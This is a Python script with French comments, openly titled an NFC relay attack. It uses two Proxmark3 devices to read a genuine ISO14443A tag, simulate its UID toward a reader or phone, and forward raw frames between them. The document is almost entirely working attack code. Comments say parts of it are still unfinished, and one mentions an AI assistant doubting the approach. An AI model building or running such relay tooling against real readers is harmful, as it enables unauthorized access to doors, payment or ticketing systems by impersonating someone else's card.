#!/usr/bin/env python3
"""
NFC Relay Attack - Proxmark3 x2  (firmware Iceman v4.20728)
Architecture: Tag <-> Mole(ACM1) <-> PC <-> Proxy(ACM0) <-> Lecteur

Corrections confirmées depuis source cmdhf14a.c :
  - CMD_HF_ISO14443A_SIMULATE = 0x0384  (pas 0x0381 qui est ISO14443B !)
  - SendCommandNG (ng_bit=1, pas de args)
  - Payload struct PACKED :
      uint8_t  tagtype        (1)
      uint16_t flags          (2)
      uint8_t  uid[10]        (10)
      uint8_t  exitAfter      (1)
      uint8_t  rats[20]       (20)
      uint8_t  ulauth_1a1_len (1)
      uint8_t  ulauth_1a2_len (1)
      uint8_t  ulauth_1a1[16] (16)
      uint8_t  ulauth_1a2[16] (16)
      Total = 68 bytes
"""

import serial
import struct
import time
import sys

# ── Constantes protocole PM3 ──────────────────────────────────────────────────
COMMANDNG_PREAMBLE_MAGIC  = 0x61334d50
COMMANDNG_POSTAMBLE_MAGIC = 0x3361
RESPONSENG_PREAMBLE_MAGIC = 0x62334d50

CMD_PING                    = 0x0109
CMD_HF_ISO14443A_READER     = 0x0385
CMD_HF_ISO14443A_SIMULATE   = 0x0384   # CORRECT - depuis pm3_cmd.h
CMD_HF_MIFARE_SIMULATE      = 0x0604   # réponse asynchrone de la sim

# Flags ISO14443A reader
ISO14A_CONNECT          = (1 << 0)
ISO14A_NO_DISCONNECT    = (1 << 1)
ISO14A_RAW              = (1 << 3)
ISO14A_APPEND_CRC       = (1 << 4)

# Flags simulation - depuis pm3_cmd.h
FLAG_7B_UID_IN_DATA = 0x0020  # UID 7 bytes passé dans le payload

DEFAULT_TIMEOUT = 5.0
RELAY_TIMEOUT   = 0.5

# ── Bas niveau ────────────────────────────────────────────────────────────────

#type de frame avec des arguments, utilisé pour le read
def send_mix(ser, cmd, arg0=0, arg1=0, arg2=0, data=b'', label=''):
    """Frame MIX : ng_bit=0, 3x uint64 args."""
    payload   = struct.pack('<QQQ', arg0, arg1, arg2) + data
    length_ng = len(payload) & 0x7FFF
    pkt  = struct.pack('<IHH', COMMANDNG_PREAMBLE_MAGIC, length_ng, cmd)
    pkt += payload
    pkt += struct.pack('<H', COMMANDNG_POSTAMBLE_MAGIC)
    if label:
        print(f"  [{label}] >> MIX cmd=0x{cmd:04X} arg0=0x{arg0:08X} arg1={arg1} data={data.hex()}")
    ser.write(pkt)
    ser.flush()

#type de frame nouvelle génération, utilisée pour le reste
def send_ng(ser, cmd, data=b'', label=''):
    """Frame NG pure : ng_bit=1, pas d'args."""
    length_ng = (len(data) & 0x7FFF) | (1 << 15)
    pkt  = struct.pack('<IHH', COMMANDNG_PREAMBLE_MAGIC, length_ng, cmd)
    pkt += data
    pkt += struct.pack('<H', COMMANDNG_POSTAMBLE_MAGIC)
    if label:
        print(f"  [{label}] >> NG  cmd=0x{cmd:04X} datalen={len(data)} data={data.hex()}")
    ser.write(pkt)
    ser.flush()


def read_response(ser, timeout=DEFAULT_TIMEOUT, label='', silent=False):
    deadline = time.time() + timeout
    raw = b''
    while len(raw) < 10:
        if time.time() > deadline:
            if label and not silent:
                print(f"  [{label}] << TIMEOUT ({len(raw)}/10)")
            return None
        c = ser.read(10 - len(raw))
        if c:
            raw += c

    magic, length_ng, cmd, status, reason = struct.unpack('<IHHBB', raw)
    length = length_ng & 0x7FFF
    ng_bit = (length_ng >> 15) & 1

    if magic != RESPONSENG_PREAMBLE_MAGIC:
        if not silent:
            print(f"  [{label}] << BAD MAGIC 0x{magic:08X}")
        ser.reset_input_buffer()
        return None

    payload = b''
    if length > 0:
        dl = time.time() + 3.0
        while len(payload) < length and time.time() < dl:
            payload += ser.read(length - len(payload))
    ser.read(2)  # postamble

    args = (0, 0, 0)
    data_out = payload
    if not ng_bit and len(payload) >= 24:
        args = struct.unpack('<QQQ', payload[:24])
        data_out = payload[24:]

    if label and not silent:
        print(f"  [{label}] << cmd=0x{cmd:04X} st={status} ng={ng_bit} "
              f"args=({args[0]},{args[1]},{args[2]}) len={len(data_out)} data={data_out[:20].hex()}")

    return {'cmd': cmd, 'status': status, 'ng': ng_bit,
            'args': args, 'data': data_out, 'payload': payload}

# ── Commandes haut niveau ─────────────────────────────────────────────────────

#Utilisation --> envoi d'un ping au début pour vérifier que les 2 ports répondent bien et pas tout faire dnas le vide
def ping(ser, label=''):
    d = bytes(range(32))
    send_ng(ser, CMD_PING, d)
    r = read_response(ser, timeout=3.0, silent=True)
    ok = r and r['data'] == d
    print(f"  [{label}] PING {'OK ✓' if ok else 'FAILED ✗'}")
    return ok


def connect_tag(ser, label=''):
    """
    Détecte le tag. flags=ISO14A_CONNECT (0x0001) confirmé.
    Réponse = iso14a_card_select_t :
      data[0:10]  = uid paddé
      data[10]    = uid_len
      data[11:13] = atqa
      data[13]    = sak
    """
    send_mix(ser, CMD_HF_ISO14443A_READER, arg0=ISO14A_CONNECT, label=label)
    resp = read_response(ser, timeout=DEFAULT_TIMEOUT, label=label)
    if not resp or len(resp['data']) < 14:
        return None
    d = resp['data']
    uid_len = d[10]
    return {
        'uid':  d[0:uid_len],
        'atqa': d[11:13],
        'sak':  d[13]
    }

#claude dis que c'est pas possible de le faore sans sim... je sias pas trop quoi en poenser
#il faut que le tag et la carte recoivent bien les bons signaux, ca je suis d'accord, pour lancer leuyrs actions, mais pour moi ca pôurrait marcher ? peut etre pas coté lecteur ?
def start_sim(ser, tagtype, uid, label=''):
    """
    Démarrer la simulation avec CMD_HF_ISO14443A_SIMULATE (0x0384).
    Payload struct PACKED (68 bytes) depuis cmdhf14a.c :
      tagtype(1) + flags(2) + uid[10] + exitAfter(1) + rats[20]
      + ulauth_1a1_len(1) + ulauth_1a2_len(1) + ulauth_1a1[16] + ulauth_1a2[16]
    """
    uid_padded = uid.ljust(10, b'\x00')[:10]
    payload = struct.pack('<B',  tagtype)          # tagtype    (1)
    payload += struct.pack('<H', FLAG_7B_UID_IN_DATA)  # flags (2) - UID 7B dans payload
    payload += uid_padded                           # uid[10]    (10)
    payload += struct.pack('<B', 0)                 # exitAfter  (1) 0=infini
    payload += bytes(20)                            # rats[20]   (20)
    payload += struct.pack('<B', 0)                 # ulauth_1a1_len (1)
    payload += struct.pack('<B', 0)                 # ulauth_1a2_len (1)
    payload += bytes(16)                            # ulauth_1a1[16] (16)
    payload += bytes(16)                            # ulauth_1a2[16] (16)
    # Total = 68 bytes

    send_ng(ser, CMD_HF_ISO14443A_SIMULATE, payload, label=label)
    # Pas de réponse immédiate - la sim tourne en arrière-plan
    time.sleep(0.3)
    read_response(ser, timeout=0.5, silent=True)

#communication mole <-> tag
def raw_to_tag(ser, raw_bytes, label=''):
    """Envoyer bytes bruts au tag (champ actif, CRC ajouté auto)."""
    flags = ISO14A_RAW | ISO14A_NO_DISCONNECT | ISO14A_APPEND_CRC
    send_mix(ser, CMD_HF_ISO14443A_READER,
             arg0=flags, arg1=len(raw_bytes), data=raw_bytes, label=label)
    return read_response(ser, timeout=RELAY_TIMEOUT, label=label)

# ── Relay ─────────────────────────────────────────────────────────────────────

class NfcRelay:

    def __init__(self, mole_port='/dev/ttyACM1', proxy_port='/dev/ttyACM0',
                 baudrate=115200, verbose=True):
        self.verbose = verbose
        print(f"[*] Mole  (tag side)    : {mole_port}")
        self.mole  = serial.Serial(mole_port,  baudrate=baudrate, timeout=0.05)
        print(f"[*] Proxy (reader side) : {proxy_port}")
        self.proxy = serial.Serial(proxy_port, baudrate=baudrate, timeout=0.05)
        time.sleep(0.3)
        self._flush()

    def _flush(self):
        self.mole.reset_input_buffer();  self.mole.reset_output_buffer()
        self.proxy.reset_input_buffer(); self.proxy.reset_output_buffer()

    def close(self):
        try: self.mole.close()
        except: pass
        try: self.proxy.close()
        except: pass

    def init(self):
        print("\n=== Vérification connexions ===")
        if not ping(self.mole, 'MOLE ') or not ping(self.proxy, 'PROXY'):
            return False

        print("\n[MOLE] Recherche du tag réel...")
        card = connect_tag(self.mole, 'MOLE')
        if not card:
            print("[MOLE] ERREUR : tag non détecté.")
            return False

        self.tag_uid  = card['uid']
        self.tag_atqa = card['atqa']
        self.tag_sak  = card['sak']
        print(f"[MOLE] Tag OK !")
        print(f"       UID  : {':'.join(f'{b:02X}' for b in self.tag_uid)}")
        print(f"       ATQA : {self.tag_atqa.hex().upper()}")
        print(f"       SAK  : {self.tag_sak:02X}")

        # NTAG213 : SAK=0x00 → tagtype=2 (Ultralight)
        #au final on génére du NTAG215 car on peut pas simuler du 213. Apparemment c'est ok. La seule diff c'esrt la taille car ,ntag215 est + grand
        tagtype = 2 if self.tag_sak == 0x00 else 1
        print(f"\n[PROXY] Démarrage simulation tagtype={tagtype} "
              f"UID={':'.join(f'{b:02X}' for b in self.tag_uid)}...")
        start_sim(self.proxy, tagtype, self.tag_uid, label='PROXY')
        print("[PROXY] Simulation active. Approche le téléphone du proxy.")
        return True

    def relay_loop(self):
        print("\n=== RELAY LOOP ===")
        print("Ctrl+C pour arrêter.\n")

        n = 0
        wait_count = 0

        try:
            while True:
                #essai de recup des réponses (pour debuguer notamment), mais le sim ne parle pas, il fait juste son taf.
                #sur readsimv7 je fais un essai avec des "cardhopper" où c'est sensé pouvoir me répondre.
                #marche pas encore, mais c'est en cours.
                resp = read_response(self.proxy, timeout=0.02, silent=True)

                if resp is None:
                    wait_count += 1
                    if wait_count % 300 == 0:
                        print("  [~] En attente du lecteur...")
                    continue

                wait_count = 0

                print(f"\n  [PROXY RAW] cmd=0x{resp['cmd']:04X} st={resp['status']} "
                      f"ng={resp['ng']} args={resp['args']} "
                      f"data={resp['data'][:24].hex()}")

                frame = self._extract_frame(resp)
                if not frame:
                    continue

                n += 1
                print(f"\n=== Échange #{n} ===")
                print(f"  LECTEUR -> PROXY : {frame.hex()}")

                tag_resp = raw_to_tag(self.mole, frame,
                                      label='MOLE' if self.verbose else '')
                if tag_resp and tag_resp['data']:
                    tag_frame = tag_resp['data']
                    print(f"  TAG    -> MOLE   : {tag_frame.hex()}")
                    self._reply_to_reader(tag_frame)
                    print(f"  PROXY  -> LECTEUR: {tag_frame.hex()}")
                else:
                    print(f"  TAG    -> MOLE   : (pas de réponse)")

        except KeyboardInterrupt:
            print("\n\n[RELAY] Arrêt propre.")

    def _extract_frame(self, resp):
        d = resp['data']
        if d and len(d) > 0 and d != bytes(len(d)):
            return d
        if not resp['ng'] and len(resp['payload']) > 24:
            rest = resp['payload'][24:]
            if rest and rest != bytes(len(rest)):
                return rest
        return None

    def _reply_to_reader(self, data):
        flags = ISO14A_RAW | ISO14A_NO_DISCONNECT | ISO14A_APPEND_CRC
        send_mix(self.proxy, CMD_HF_ISO14443A_READER,
                 arg0=flags, arg1=len(data), data=data)
        read_response(self.proxy, timeout=0.05, silent=True)

    def run(self):
        print("\n" + "=" * 62)
        print("  NFC RELAY ATTACK  |  Proxmark3 x2  |  Iceman firmware")
        print("  Tag <-> Mole(ACM1) <-> PC <-> Proxy(ACM0) <-> Lecteur")
        print("=" * 62)
        if not self.init():
            return
        self.relay_loop()


if __name__ == '__main__':
    relay = NfcRelay(
        mole_port  = '/dev/ttyACM1',
        proxy_port = '/dev/ttyACM0',
        verbose    = True
    )
    try:
        relay.run()
    finally:
        relay.close()
        print("[*] Ports fermés.")
